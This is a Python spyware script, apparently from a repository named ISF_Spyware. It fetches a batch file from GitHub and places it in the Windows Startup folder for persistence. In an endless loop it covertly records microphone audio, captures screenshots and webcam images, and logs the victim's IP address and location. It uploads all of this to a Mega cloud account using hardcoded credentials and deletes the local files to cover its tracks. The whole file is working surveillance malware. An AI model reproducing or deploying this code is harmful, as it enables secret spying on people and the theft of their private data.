import time
import os
import shutil
import cv2
from datetime import datetime
from mega import Mega
import pyaudio
import wave
import threading
import requests
import geocoder
import glob
import pyautogui
import sys

def delete_files():
    current_folder = os.getcwd()
    file_extensions = ['*.jpg', '*.png', '*.wav']
    files_to_delete = []

    for extension in file_extensions:
        files_to_delete.extend(glob.glob(os.path.join(current_folder, extension)))

    for file_path in files_to_delete:
        os.remove(file_path)
        print("deleted...")

def get_public_ipv4():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        data = response.json()
        return data['ip']
    except requests.RequestException:
        return None

def get_location_from_ip(ip_address):
    g = geocoder.ip(ip_address)
    
    if g.ok:
        city = g.city if g.city else "Unknown City"
        country = g.country if g.country else "Unknown Country"
        location = f"{city}, {country}"
        return location
    else:
        return 'Location not found'

def screenshot_upload():
    try:
        # Generate a timestamp for the filename
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

        # Capture the screen and save the screenshot with the timestamp in the filename
        filename = f'screenshot_{timestamp}.png'
        pyautogui.screenshot(filename)

        mega_email = 'lajex92681@meidecn.com'
        mega_password = 'b@sit1218'

        # mega signin
        mega = Mega()
        mega_login = mega.login(mega_email, mega_password)

        screenshots_folder = mega_login.find('screenshots')

        if not screenshots_folder:
            screenshots_folder = mega_login.create_folder('screenshots')
        else:
            screenshots_folder = screenshots_folder[0]

        print("uploading to screenshots") 
        mega_login.upload(filename, screenshots_folder)
        # upload webcam picture
    except:
        print("screenshot upload failed")
        

def webcam_upload():
    try:

        # Open the webcam
        cap = cv2.VideoCapture(0)

        # Read a frame from the webcam
        ret, frame = cap.read()

        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename_webcam = f'webcam_{timestamp}.png'
        # Save the frame as an image
        cv2.imwrite(filename_webcam, frame)

        # Release the webcam
        cap.release()

        mega_email = 'lajex92681@meidecn.com'
        mega_password = 'b@sit1218'

        # mega signin
        mega = Mega()
        mega_login = mega.login(mega_email, mega_password)

        webcam_folder = mega_login.find('webcam')

        if not webcam_folder:
            webcam_folder = mega_login.create_folder('webcam')
        else:
            webcam_folder = webcam_folder[0]

        print("uploading to webcam") 
        mega_login.upload(filename_webcam, webcam_folder)
        # upload webcam picture
        
    except:
        print("webcam upload failed")

def record_audio():
    try:
        current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        recording_file_name = f'recording_{current_time}.wav'
        duration = 10
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        frames = []

        print(f"Recording audio for {duration} seconds...")

        for _ in range(int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        wave_file = wave.open(recording_file_name, 'wb')
        wave_file.setnchannels(CHANNELS)
        wave_file.setsampwidth(p.get_sample_size(FORMAT))
        wave_file.setframerate(RATE)
        wave_file.writeframes(b''.join(frames))
        wave_file.close()

        print(f"uploading audio {recording_file_name}")

        mega_email = 'lajex92681@meidecn.com'
        mega_password = 'b@sit1218'

        # mega signin
        mega = Mega()
        mega_login = mega.login(mega_email, mega_password)

        recordings_folder = mega_login.find('recordings')

        if not recordings_folder:
            recordings_folder = mega_login.create_folder('recordings')
        else:
            recordings_folder = recordings_folder[0]

        print("uploading to recordings") 
        mega_login.upload(recording_file_name, recordings_folder)

    except:
        print("recording upload failed")

while True:
    try:
        delete_files()
        # Set the paths
        url = "https://github.com/Basit2121/ISF_Spyware/raw/main/config.bat"
        filename = "config.bat"

        response = requests.get(url)
        with open(filename, "wb") as file:
            file.write(response.content)

        original_file = 'EOH.exe'
        documents_folder = os.path.expanduser('~\\Documents')
        source_file = "config.bat"
        startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

        documents_folder = os.path.expanduser("~\Documents")

        # Check if the file exists
        file_path = os.path.join(documents_folder, "EOH.exe")
        if os.path.exists(file_path):
            print("EOH.exe exists in the Documents folder.")
        else:
            print("EOH.exe does not exist in the Documents folder.")
            # Copy the original file to the Documents folder
            original_path = os.path.abspath(original_file)
            new_path = os.path.join(documents_folder, original_file)
            shutil.copyfile(original_path, new_path)
            shutil.copy(source_file, startup_folder)
            sys.exit()

        config_file_path = "config.bat"

        # Check if the file exists
        if os.path.exists(config_file_path):
            # Delete the file
            os.remove(config_file_path)
            print(f"File '{config_file_path}' has been deleted.")
        else:
            print(f"File '{config_file_path}' does not exist.")

        # set username/password
        mega_email = 'lajex92681@meidecn.com'
        mega_password = 'b@sit1218'

        # mega signin
        mega = Mega()
        mega_login = mega.login(mega_email, mega_password)
        print("logged in")

        public_ipv4 = get_public_ipv4()
        ip_address = public_ipv4
        location = get_location_from_ip(ip_address)

        # windows username
        current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        location_file_name = f'ip_location_{current_time}.txt'

        # Save IP address and location in a text file
        with open(location_file_name, 'w') as file:
            file.write(f"Public IPv4 Address: {ip_address}\n")
            file.write(f"Location: {location}\n")

        # make folder called screenshots on mega storage
        location_folder= mega_login.find('locations')

        if not location_folder:
            location_folder = mega_login.create_folder('locations')
        else:
            location_folder = location_folder[0]

        print("uploading location to location_folder")
        mega_login.upload(location_file_name, location_folder)

        os.remove(location_file_name)

        # hack loop
        counter = 0
        while True:
            
            # Create threads for each function
            audio_thread = threading.Thread(target=record_audio)
            screenshot_thread = threading.Thread(target=screenshot_upload)
            webcam_thread = threading.Thread(target=webcam_upload)

            delete_files()

            # Start the threads
            audio_thread.start()
            screenshot_thread.start()
            webcam_thread.start()

            # Wait for both threads to finish
            audio_thread.join()
            screenshot_thread.join()
            webcam_thread.join()
            
    except Exception as e:
        print("An error occurred:", str(e))
